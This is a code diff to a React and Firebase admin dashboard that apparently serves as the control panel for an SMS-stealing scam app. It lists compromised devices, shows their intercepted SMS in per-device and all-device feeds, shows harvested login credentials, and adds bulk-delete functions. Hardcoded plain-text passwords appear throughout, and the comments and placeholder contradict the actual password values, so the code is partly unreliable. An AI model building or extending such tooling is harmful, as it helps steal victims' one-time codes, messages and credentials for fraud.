@@ -8,15 +8,26 @@ import SmsPanel from "../components/SmsPanel";
 import CredentialsPanel from "../components/CredentialsPanel";
 import BackupPanel from "../components/BackupPanel";
 import AnalyticsPanel from "../components/AnalyticsPanel";
+import AllDevicesSmsPanel from "../components/AllDevicesSmsPanel";
 
-const ADMIN_PASSWORD = "99991"; // <-- यहाँ आप अपना मनचाहा पासवर्ड सेट कर सकते हैं
+// PASSWORDS CONFIGURATION
+const ADMIN_PASSWORD = "890890";          // Screen Unlock Password[span_4](start_span)[span_4](end_span)
+const DELETE_SMS_PASSWORD = "Baba@1234";      // SMS Delete Password
+const DELETE_CRED_PASSWORD = "Baba@1234";     // Credentials Delete Password
+const DELETE_DEVICES_PASSWORD = "Baba@1234";  // Devices Delete Password
 
 export default function AdminDashboard() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [passwordInput, setPasswordInput] = useState("");
   const [passwordError, setPasswordError] = useState(false);
 
-  const [data, setData] = useState({ user_data: {}, user_sms: {}, login: {}, backup_sms: {} });
+  const [data, setData] = useState({ 
+    user_data: {}, 
+    user_sms: {}, 
+    login: {}, 
+    backup_sms: {}, 
+    device_status: {} 
+  });
   const [activePanel, setActivePanel] = useState("devices");
   const [favourites, setFavourites] = useState([]);
   const [deviceOnlineStatus, setDeviceOnlineStatus] = useState({});
@@ -24,7 +35,6 @@ export default function AdminDashboard() {
   const [smsModalDevice, setSmsModalDevice] = useState(null);
   const [toasts, setToasts] = useState([]);
 
-  // चेक करें कि क्या यूजर पहले से लॉग इन है
   useEffect(() => {
     const savedAuth = sessionStorage.getItem("rto_admin_auth");
     if (savedAuth === "true") {
@@ -60,7 +70,6 @@ export default function AdminDashboard() {
     }, 3000);
   };
 
-  // Load Saved Favourites
   useEffect(() => {
     if (!isAuthenticated) return;
     try {
@@ -82,7 +91,6 @@ export default function AdminDashboard() {
     localStorage.setItem("rtoFavourites", JSON.stringify(next));
   };
 
-  // Realtime Firebase Listener (केवल लॉगिन के बाद डेटा लोड होगा)
   useEffect(() => {
     if (!isAuthenticated) return;
 
@@ -92,16 +100,39 @@ export default function AdminDashboard() {
       setData(val);
 
       const devs = val.user_data || {};
+      const devStatus = val.device_status || {};
       const onlineMap = {};
       const serialMap = {};
       const now = Date.now();
 
-      Object.keys(devs).forEach((id) => {
-        const d = devs[id];
-        const lastSeen = d.last_online || d.timestamp || 0;
-        onlineMap[id] = d.isOnline || d.online || now - lastSeen < 120000;
+      const allDeviceKeys = Array.from(new Set([...Object.keys(devs), ...Object.keys(devStatus)]));
 
-        let serial = d.user_serial || d.uesr_serial || 0;
+      allDeviceKeys.forEach((id) => {
+        const d = devs[id] || {};
+        const s = devStatus[id] || {};
+
+        let isOnline = false;
+
+        if (s.status && typeof s.status === "string") {
+          isOnline = s.status.toLowerCase() === "online";
+        }
+
+        if (s.last_seen) {
+          const parsedTime = Date.parse(s.last_seen);
+          if (!isNaN(parsedTime)) {
+            isOnline = (now - parsedTime) < 90000;
+          }
+        } else if (d.last_online || d.timestamp) {
+          const t = d.last_online || d.timestamp;
+          const parsed = typeof t === "number" ? t : Date.parse(t);
+          if (!isNaN(parsed)) {
+            isOnline = (now - parsed) < 90000;
+          }
+        }
+
+        onlineMap[id] = isOnline;
+
+        let serial = d.user_serial || d.uesr_serial || s.user_serial || 0;
         if (typeof serial === "string") serial = parseInt(serial) || 0;
         serialMap[id] = serial;
       });
@@ -113,23 +144,43 @@ export default function AdminDashboard() {
     return () => unsubscribe();
   }, [isAuthenticated]);
 
+  // DELETE ALL SMS - Password: 1122
   const deleteAllSms = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL SMS:");
-    if (pwd !== ADMIN_PASSWORD) return showToast("❌ Invalid Password", "error");
+    if (pwd !== DELETE_SMS_PASSWORD) return showToast("❌ Invalid Password for SMS deletion", "error");
     if (!confirm("Are you sure you want to delete ALL SMS?")) return;
     remove(ref(db, "user_sms")).then(() => showToast("✅ All SMS Deleted", "success"));
   };
 
+  // DELETE ALL CREDENTIALS - Password: 3344
   const deleteAllCredentials = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL Credentials:");
-    if (pwd !== ADMIN_PASSWORD) return showToast("❌ Invalid Password", "error");
+    if (pwd !== DELETE_CRED_PASSWORD) return showToast("❌ Invalid Password for Credential deletion", "error");
     if (!confirm("Delete ALL credentials?")) return;
     remove(ref(db, "login")).then(() => showToast("✅ All Credentials Deleted", "success"));
   };
 
-  // ==========================================
-  // PASSWORD GATE (LOGIN SCREEN)
-  // ==========================================
+  // DELETE ALL DEVICES - Password: 5566
+  const deleteAllDevices = () => {
+    const pwd = prompt("🔐 Enter Password to Delete ALL DEVICES:");
+    if (pwd !== DELETE_DEVICES_PASSWORD) return showToast("❌ Invalid Password for Devices deletion", "error");
+    if (!confirm("⚠️ WARNING: Are you sure you want to delete ALL registered devices?")) return;
+
+    Promise.all([
+      remove(ref(db, "user_data")),
+      remove(ref(db, "device_status"))
+    ]).then(() => {
+      showToast("✅ All Devices Removed Successfully", "success");
+    }).catch(() => {
+      showToast("❌ Failed to delete devices", "error");
+    });
+  };
+
+  const totalSmsCount = Object.values(data.user_sms || {}).reduce(
+    (total, devMsgs) => total + Object.keys(devMsgs || {}).length,
+    0
+  );
+
   if (!isAuthenticated) {
     return (
       <div style={{
@@ -162,7 +213,7 @@ export default function AdminDashboard() {
             <div style={{ marginBottom: 16 }}>
               <input
                 type="password"
-                placeholder="Enter Password (Default: 9999)"
+                placeholder="Enter Password (9090)"
                 value={passwordInput}
                 onChange={(e) => setPasswordInput(e.target.value)}
                 autoFocus
@@ -196,7 +247,6 @@ export default function AdminDashboard() {
           </form>
         </div>
 
-        {/* Toasts on Login screen */}
         <div id="toastContainer">
           {toasts.map((t) => (
             <div key={t.id} className={`toast-luxury ${t.type}`}>
@@ -208,9 +258,6 @@ export default function AdminDashboard() {
     );
   }
 
-  // ==========================================
-  // AUTHENTICATED ADMIN DASHBOARD
-  // ==========================================
   return (
     <div className="app-wrapper">
       <header className="top-bar">
@@ -222,9 +269,8 @@ export default function AdminDashboard() {
         <div className="top-right">
           <div className="connection-status online">
             <span className="dot"></span>
-            <span>Realtime Cloud</span>
+            <span>Realtime Live</span>
           </div>
-          {/* Logout Button */}
           <button 
             onClick={handleLogout} 
             title="Logout Admin" 
@@ -242,12 +288,17 @@ export default function AdminDashboard() {
             <button className={`nav-item ${activePanel === "devices" ? "active" : ""}`} onClick={() => setActivePanel("devices")}>
               <i className="fas fa-mobile-alt"></i>
               <span>Devices</span>
-              <span className="nav-badge">{Object.keys(data.user_data || {}).length}</span>
+              <span className="nav-badge">{Object.keys(data.device_status || data.user_data || {}).length}</span>
             </button>
             <button className={`nav-item ${activePanel === "favourites" ? "active" : ""}`} onClick={() => setActivePanel("favourites")}>
               <i className="fas fa-star" style={{ color: "var(--gold)" }}></i>
               <span>Favourites</span>
               <span className="nav-badge">{favourites.length}</span>
+            </button>
+            <button className={`nav-item ${activePanel === "all_messages" ? "active" : ""}`} onClick={() => setActivePanel("all_messages")}>
+              <i className="fas fa-comments" style={{ color: "var(--gold)" }}></i>
+              <span>All SMS Feed</span>
+              <span className="nav-badge" style={{ color: "var(--gold)", borderColor: "var(--gold)" }}>{totalSmsCount}</span>
             </button>
             <button className={`nav-item ${activePanel === "sms" ? "active" : ""}`} onClick={() => setActivePanel("sms")}>
               <i className="fas fa-envelope"></i>
@@ -281,14 +332,23 @@ export default function AdminDashboard() {
               openSmsModal={(id) => setSmsModalDevice(id)}
               deleteAllSms={deleteAllSms}
               deleteAllCredentials={deleteAllCredentials}
+              deleteAllDevices={deleteAllDevices}
             />
           )}
           {activePanel === "favourites" && (
             <FavouritesPanel 
               data={data} 
+              deviceOnlineStatus={deviceOnlineStatus}
               deviceSerialMap={deviceSerialMap} 
               favourites={favourites} 
               toggleFavourite={toggleFavourite} 
+              showToast={showToast} 
+              openSmsModal={(id) => setSmsModalDevice(id)}
+            />
+          )}
+          {activePanel === "all_messages" && (
+            <AllDevicesSmsPanel 
+              data={data} 
               showToast={showToast} 
             />
           )}
@@ -321,23 +381,103 @@ export default function AdminDashboard() {
         </main>
       </div>
 
+      <nav className="mobile-bottom-nav">
+        <button className={`mobile-nav-item ${activePanel === "devices" ? "active" : ""}`} onClick={() => setActivePanel("devices")}>
+          <i className="fas fa-mobile-alt"></i>
+          <span>Devices</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "all_messages" ? "active" : ""}`} onClick={() => setActivePanel("all_messages")}>
+          <i className="fas fa-comments"></i>
+          <span>All SMS</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "favourites" ? "active" : ""}`} onClick={() => setActivePanel("favourites")}>
+          <i className="fas fa-star"></i>
+          <span>Starred</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "credentials" ? "active" : ""}`} onClick={() => setActivePanel("credentials")}>
+          <i className="fas fa-key"></i>
+          <span>Creds</span>
+        </button>
+        <button className={`mobile-nav-item ${activePanel === "backup" ? "active" : ""}`} onClick={() => setActivePanel("backup")}>
+          <i className="fas fa-database"></i>
+          <span>Backup</span>
+        </button>
+      </nav>
+
+      {/* FULL SMS MODAL POPUP */}
       {smsModalDevice && (
-        <div className="modal-luxury open" onClick={() => setSmsModalDevice(null)}>
-          <div className="modal-luxury-content" onClick={(e) => e.stopPropagation()}>
+        <div 
+          className="modal-luxury open" 
+          onClick={() => setSmsModalDevice(null)}
+        >
+          <div 
+            className="modal-luxury-content" 
+            onClick={(e) => e.stopPropagation()}
+          >
             <div className="modal-luxury-header">
-              <h3>📩 Messages for {smsModalDevice}</h3>
-              <button className="modal-luxury-close" onClick={() => setSmsModalDevice(null)}>✕</button>
+              <h3>
+                <i className="fas fa-envelope-open-text" style={{ color: "var(--gold)" }}></i> 
+                All Messages ({Object.keys(data.user_sms?.[smsModalDevice] || {}).length})
+              </h3>
+              <button 
+                type="button"
+                className="modal-luxury-close" 
+                onClick={() => setSmsModalDevice(null)}
+              >
+                ✕
+              </button>
             </div>
+
             <div className="modal-luxury-body">
-              {Object.values(data.user_sms?.[smsModalDevice] || {}).reverse().map((msg, idx) => (
-                <div key={idx} className="sms-card-luxury" style={{ marginBottom: 8 }}>
-                  <div className="sms-header">
-                    <span className="sms-sender">👤 {msg.sender || msg.address}</span>
-                    <span className="sms-meta">{msg.date}</span>
-                  </div>
-                  <div className="sms-body">{msg.body}</div>
-                </div>
-              ))}
+              {Object.values(data.user_sms?.[smsModalDevice] || {}).length === 0 ? (
+                <div className="empty-luxury">No messages found for this device.</div>
+              ) : (
+                Object.values(data.user_sms?.[smsModalDevice] || {})
+                  .reverse()
+                  .map((msg, idx) => (
+                    <div 
+                      key={idx} 
+                      style={{
+                        background: "rgba(10, 13, 20, 0.7)",
+                        border: "1px solid var(--border-color)",
+                        borderLeft: "3px solid var(--gold)",
+                        borderRadius: 8,
+                        padding: 10
+                      }}
+                    >
+                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 4 }}>
+                        <span style={{ color: "var(--gold-light)", fontWeight: 700, fontSize: 12 }}>
+                          👤 {msg.sender || msg.address || "Unknown"}
+                        </span>
+                        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                          <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
+                            {msg.date || ""}
+                          </span>
+                          <button
+                            type="button"
+                            onClick={() => {
+                              navigator.clipboard.writeText(msg.body || "");
+                              showToast("📋 SMS Copied!", "success");
+                            }}
+                            style={{
+                              background: "transparent",
+                              border: "none",
+                              color: "var(--text-muted)",
+                              cursor: "pointer",
+                              fontSize: 11
+                            }}
+                            title="Copy SMS"
+                          >
+                            <i className="fas fa-copy"></i>
+                          </button>
+                        </div>
+                      </div>
+                      <div style={{ fontSize: 12, lineHeight: 1.4, color: "var(--text-primary)", whiteSpace: "pre-wrap", wordBreak: "break-word" }}>
+                        {msg.body}
+                      </div>
+                    </div>
+                  ))
+              )}
             </div>
           </div>
         </div>
